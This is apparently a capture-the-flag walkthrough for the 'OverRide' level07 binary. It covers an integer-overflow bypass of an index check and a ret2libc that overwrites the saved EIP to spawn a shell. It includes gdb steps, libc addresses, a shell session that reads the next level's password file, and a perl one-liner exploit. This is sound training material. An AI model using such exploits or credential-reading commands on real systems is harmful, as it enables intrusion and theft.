@@ -1,0 +1,74 @@
+This program is a number saver. It saves in the stack values from the user from an index and a number took from the stdin with scanf.
+The binary does not accept all type of index with a protection that reject all indexes divisible by 3.
+
+So the goal here is to overwrite data by bypassing the protection.
+
+1. Here we want to overwrite the main EIP to redirect the execution flaw at the end of that function (and get a shell)
+2. To bypass the protection, we will make the data writing overflow to write at the EIP address but with a different input value, that is not divisible by 3
+3. From now, we need to deduct the offset between the index 0 and the EIP address
+	a. We open the binary with gdb
+	b. We put a breakpoint at each command input listening
+	c. We store a value at the index 1
+	d. After hiting the breakpoint, we inspect the stack and find our value at the address of 0xffffd547
+	e. With the gdb command 'info frame', we have the save EIP address at 0xffffd70c
+	f. The difference is 453 bytes. As it's an index we will divide it by 4 and get 114 (in a float world is 113.25 but we are working with ints)
+4. So 114 is the index, but it is divisible by 3. We have to use this index to overwrite the EIP.
+5. To avoid the protection condition, we will enter an index that will overflow at the real index calculation and not be divisible by 3
+	a. Just before the number is write in the memory, it is multiplicated by 4
+	b. To correctly overflow, the binary must do ESP + ARRAY_INDEX + UINT_MAX + 453 to edit the EIP save
+	c. Our input will be :
+		I. (UINT_MAX / 4) + CEIL(453 / 4)
+		II. (4294967295 / 4) + 114
+		III. (4294967295 / 4) + 114
+		IV. CEIL(4294967295 / 4) + 114
+		V. 1073741824 + 114
+		VI. 1073741938
+6. Now we know how to redirect the execution flow, we will do a ret2libc to get a shell. First, we need to know the address of the system function and the address of the string /bin/sh in the libc
+	a. Open the program in gdb
+	b. Run the program one time and get the address of system = 0xf7e6aed0
+	c. To know the address of /bin/sh, set a breakpoint in the main, run the command 'i proc map' and find the string in the biggest libc range
+	d. Run this command with the addresses of libc : find 0xf7e2c000, 0xf7fcc000, "/bin/sh" -> 0xf7f897ec
+7. The system address will replace the EIP save of the main function and the address of the sh string will be at EIP + (2 * 4). This is at an allowed index of 116
+8. Let's demonstrate all these things :
+	a. Address of system is 0xf7e6aed0 in hex and 4159090384 that we need to write at the overflowing index of 1073741938
+	b. Address of /bin/sh is 0xf7f897ec in hex and 4160264172 that we write at the index of 116
+9. Here is the result :
+
+level07@OverRide:~$ ./level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: read
+ Index: 1073741938
+ Number at data[1073741938] is 4159090384
+ Completed read command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: read
+ Index: 116
+ Number at data[116] is 4160264172
+ Completed read command successfully
+Input command: quit
+$ whoami
+level08
+$ cat ~level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+$ 
+
+10. Here is a one liner : (perl -e 'print "store\n4159090384\n1073741938\nstore\n4160264172\n116\nquit\n"'; cat -) | ./level07
+11. We got the flag 
+
